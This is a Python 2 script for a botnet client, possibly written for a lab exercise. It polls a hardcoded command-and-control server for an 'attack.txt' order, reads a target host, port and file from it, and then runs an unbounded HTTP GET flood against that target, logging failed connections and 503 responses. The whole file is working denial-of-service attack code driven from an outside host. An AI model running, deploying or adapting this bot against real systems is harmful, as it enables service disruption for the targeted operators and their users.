#!/usr/bin/python
#from time import ctime, time
from time import sleep
from socket import error as err
import socket
import sys


import httplib
import sys
BUFFERSIZE = 2048
buffer = [BUFFERSIZE]

class MyException(Exception):
    def __init__(self,value):
        self.value = value

class Bot():
    def __init__(self):
        self.server = '192.168.60.120:8081'
        self.conn = httplib.HTTPConnection(self.server)
        self.msg = 'attack.txt'
        self.recv_data = ''
        self.num_connections = 0
        self.failed_connections = 0

    def receive_msg(self):
        self.conn.request('GET', self.msg)
        self.resp = self.conn.getresponse()
        print "=================================="
        print "Status %s %s" %(self.resp.status,self.resp.reason)
        self.recv_data = self.resp.read()
        self.conn.close()

        print "=================================="
        print self.recv_data

        if len(self.recv_data) > 0:
          if (self.recv_data.startswith('START')):
              msg1= self.recv_data.split()
              host = msg1[2]
              port = msg1[3]
              req_file = msg1[4]
              print "=================================="
              print ("****Botnet Attack Activated*****")
              print "=================================="
              self.start_dos_attack(host, port, req_file)

    def start_dos_attack(self, host, port, req_file):
        #for i in range(0, 50):
        while True:
            try:
                web_server = host + ':' + port
                conn = httplib.HTTPConnection(web_server,timeout=1.5)
                self.num_connections += 1
                print "=================================="
                print ("Num of requests sent %d" %self.num_connections)
                conn.request('GET', req_file)
                w_msg = conn.getresponse()
                code = w_msg.status
                if code == 503:
                    print "Status %s %s" %(w_msg.status,w_msg.reason)
                    self.failed_connections += 1
                    raise MyException(self.failed_connections)
                else:
                    data = w_msg.read()
                    if len(data) > 0:
                        print ("File info.html downloaded")
                        print "=================================="
                sleep(0.22)
            except MyException as msg:
                #self.num_connections = self.num_connections + 1
                #print(" **** Connections failed %d ****" % self.num_connections)
                print(" Num of Connections Failed %d" % msg.value)
                print "=================================="
            except err as msg:
                print "Message: ", msg
                self.failed_connections += 1
                print("Num of Connections failed %d " % self.failed_connections)
                print "=================================="



if __name__ == '__main__':
  bot = Bot()
  bot.receive_msg()


